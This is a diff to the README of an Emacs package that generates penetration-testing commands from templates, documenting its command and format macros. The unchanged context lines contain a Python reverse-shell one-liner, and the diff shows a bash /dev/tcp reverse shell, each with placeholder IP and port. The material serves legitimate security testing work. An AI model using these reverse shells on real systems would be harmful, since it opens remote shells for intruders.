@@ -1,6 +1,6 @@
 # icheat
 
-(btw, work in progress.)
+(btw, work in progress)
 
 Interactive cheatsheet in Emacs.
 
@@ -29,23 +29,38 @@ contexts, such as during a penetration test.
   ("python-1" . "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%ip\",%port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")))
 ```
 
-For each tool declared, a specific function will be created. This
-function can be used as an interactive cheatsheet in order to generate
-the different types of commands for that particular tool. This should
-help you in the moment of need. The name of the function follows the
-name of the command. In the previous example the code will create the
-functions `icheat-cmd-nmap`, `icheat-cmd-smb` and
+For each tool declared using the macro `icheat-def-cmd`, a function
+will be created that can be used to generate the different types of
+commands for that particular tool. This is an approach to implement
+the idea of an 'interactive cheatsheet'. For example the code shown
+will create the functions `icheat-cmd-nmap`, `icheat-cmd-smb` and
 `icheat-cmd-reverse`.
 
-Observe also how during the creation of the command list you can use
+Notice that during the creation of the command list you can use
 special format identifiers such as `%ip`, `%port`, `%domain`,
-`%share`. These identifiers are resolved during the generation of the
-command. The final mechanism is still being implemented.
+`%share`.
 
 ```
 bash -i >& /dev/tcp/%ip/%port 0>&1
 ```
 
+These identifiers are resolved during the generation of the command by
+defining appropriate formatting options using the `icheat-def-fmt`
+macro.
+
+```
+(icheat-def-fmt "ip" nil)
+
+(icheat-def-fmt
+ "wordlist"
+ (("directory-list-2.3-small.txt"  . "/home/leo/tool/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt")
+  ("directory-list-2.3-medium.txt" . "/home/leo/tool/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt")
+  ("directory-list-2.3-big.txt"    . "/home/leo/tool/wordlist/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt")
+  ))
+
+```
+
 Finally, it is worth to note that depending on how the function is
 called, the generated output is returned either as a direct value, or
-it is copied into the kill-ring.
+it is copied into the kill-ring. By default, when calling
+interactively, the function will copy its output into the kill-ring.
